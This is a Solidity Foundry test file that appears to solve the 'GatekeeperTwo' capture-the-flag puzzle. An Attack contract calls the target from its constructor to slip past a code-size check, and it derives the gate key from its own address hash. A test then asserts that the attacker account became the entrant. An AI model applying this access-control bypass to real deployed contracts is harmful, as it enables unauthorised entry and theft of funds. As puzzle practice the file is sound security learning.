// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperTwo.sol";
import "@forge-std/Test.sol";

contract Attack {
    GatekeeperTwo public g2Contract;

    constructor(address g2) {
        g2Contract = GatekeeperTwo(g2);
        uint64 pass = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        g2Contract.enter(bytes8(pass));
    }
}

contract GatekeeperTwoTest is Test {

    GatekeeperTwo public g2contract;
    address public attacker;
    function setUp() public {
        g2contract = new GatekeeperTwo();
        attacker = vm.addr(1);
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker); // setting address and tx.origin
        Attack attack = new Attack(address(g2contract));
        vm.stopPrank();
        assert(g2contract.entrant() == attacker);
    }
}